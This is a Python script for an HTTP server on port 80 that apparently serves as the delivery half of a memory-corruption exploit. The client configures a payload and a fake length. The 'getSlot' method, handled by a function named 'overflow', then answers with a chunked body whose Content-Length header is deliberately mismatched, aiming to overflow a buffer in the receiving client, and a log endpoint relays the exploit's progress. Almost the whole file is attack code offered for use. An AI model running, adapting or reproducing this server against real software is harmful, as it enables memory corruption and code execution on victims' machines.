from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer as HTTPServer
import json
from base64 import b64decode

dummy_len = 0
payload = b""

class Handler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):
        # print("handling get request")
        super().do_GET()

    def config(self, req):
        global dummy_len, payload
        dummy_len = req["len"]
        payload = bytes(req["payload"].values())

        print(f"len = {dummy_len:#x}")

        self.send_header("Content-Length", "0")
        self.end_headers()

    def log(self, req):
        print(req["msg"])

        self.send_header("Content-Length", "0")
        self.end_headers()

    def overflow(self, req):
        print("sending payload")
        print(f"dummy len = {dummy_len:#x}, actual len = {len(payload):#x}")

        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Content-Length", str(dummy_len))
        self.end_headers()

        body: bytes = b""
        body += f"{len(payload):x}\r\n".encode()
        body += payload
        body += b"\r\n"
        body += b"0\r\n\r\n\r\n"
        # print(body)

        self.wfile.write(body)

    def do_POST(self):
        print("reading length")
        contentlen = int(self.headers.get("Content-Length"))
        print(contentlen)
        data = self.rfile.read(contentlen)
        # print(data)
        req = json.loads(data)
        method = req["method"]

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")

        print(method)

        match method:
            case "config":
                self.config(req)
            case "log":
                self.log(req)
            case "getSlot":
                self.overflow(req)
            case _:
                print(f"unknown method: {method}")

    # def log_request(self, code = "-", size = "-"):
        # return

server = HTTPServer(("0.0.0.0", 80), Handler)
server.serve_forever()